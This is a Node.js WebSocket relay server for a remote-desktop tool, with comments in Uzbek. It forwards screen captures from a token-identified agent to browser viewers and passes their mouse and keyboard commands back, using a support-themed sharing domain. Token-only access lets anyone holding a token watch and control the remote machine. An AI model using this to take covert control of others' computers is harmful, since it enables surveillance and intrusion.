const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');
const path = require('path');

const server = http.createServer((req, res) => {
    let filePath = path.join(__dirname, 'public', 'index.html');
    
    fs.readFile(filePath, (err, data) => {
        if (err) {
            res.writeHead(404, { 'Content-Type': 'text/plain' });
            res.end('index.html topilmadi!');
        } else {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(data);
        }
    });
});

const wss = new WebSocket.Server({ server });
const sessions = new Map(); // token -> { agentWs, viewers: Set, agentName }

wss.on('connection', (ws, req) => {
    let currentToken = null;
    let currentRole = null;

    ws.on('message', (message, isBinary) => {
        const isBin = Buffer.isBuffer(message) || isBinary || (message instanceof ArrayBuffer);

        if (isBin) {
            // Agentdan kelayotgan ekran rasmlari (JPEG)
            if (currentRole === 'agent' && currentToken) {
                const session = sessions.get(currentToken);
                if (session && session.viewers) {
                    for (let viewerWs of session.viewers) {
                        if (viewerWs.readyState === WebSocket.OPEN) {
                            viewerWs.send(message);
                        }
                    }
                }
            }
        } else {
            try {
                const rawData = message.toString();
                const data = JSON.parse(rawData);

                console.log("Kelgan xabar:", data.type);

                // 1. Rust Agent ulanishi va ro'yxatdan o'tishi
                if (data.type === 'join-agent') {
                    currentToken = data.token ? data.token.trim() : null;
                    currentRole = 'agent';
                    
                    if (!currentToken) return;

                    let session = sessions.get(currentToken);
                    if (!session) {
                        session = { 
                            agentWs: ws, 
                            viewers: new Set(), 
                            agentName: data.hostname || 'REMOTE-PC' 
                        };
                        sessions.set(currentToken, session);
                    } else {
                        session.agentWs = ws;
                        if (data.hostname) session.agentName = data.hostname;
                    }

                    const sharingUrl = `https://admin.falconsupportsession.com/sharing?c=${currentToken}`;
                    
                    // Agentga darhol javob qaytaramiz
                    ws.send(JSON.stringify({
                        type: 'registered',
                        sharingUrl: sharingUrl
                    }));

                    console.log('\n========================================');
                    console.log(`KOMPYUTER ULANDI: [ ${session.agentName} ]`);
                    console.log(`SHARING URL: ${sharingUrl}`);
                    console.log('========================================\n');
                } 
                // 2. Brauzer Viewer ulanishi
                else if (data.type === 'join-viewer') {
                    currentToken = data.token ? data.token.trim() : null;
                    currentRole = 'viewer';
                    
                    if (!currentToken) return;

                    let session = sessions.get(currentToken);
                    if (!session) {
                        session = { agentWs: null, viewers: new Set(), agentName: 'REMOTE-PC' };
                        sessions.set(currentToken, session);
                    }
                    
                    session.viewers.add(ws);
                    console.log('Browser Viewer connected, token:', currentToken);

                    if (session.agentWs) {
                        ws.send(JSON.stringify({ 
                            type: 'joined-success', 
                            agentName: session.agentName 
                        }));
                    }
                } 
                // 3. Sichqoncha va klaviatura buyruqlari (Viewer -> Agent)
                else if (currentRole === 'viewer') {
                    const session = sessions.get(currentToken);
                    if (session && session.agentWs && session.agentWs.readyState === WebSocket.OPEN) {
                        session.agentWs.send(rawData);
                    }
                }
            } catch (e) {
                console.error('JSON xatoligi:', e.message);
            }
        }
    });

    ws.on('close', () => {
        if (currentToken && sessions.has(currentToken)) {
            const session = sessions.get(currentToken);
            if (ws === session.agentWs) {
                session.agentWs = null;
                for (let viewerWs of session.viewers) {
                    if (viewerWs.readyState === WebSocket.OPEN) {
                        viewerWs.send(JSON.stringify({ type: 'disconnected' }));
                    }
                }
                console.log('Agent uzildi, token saqlandi:', currentToken);
            } else {
                session.viewers.delete(ws);
            }
        }
    });
});

const PORT = 3030;
server.listen(PORT, '127.0.0.1', () => {
    console.log(`Server port ${PORT} da ishga tushdi`);
});
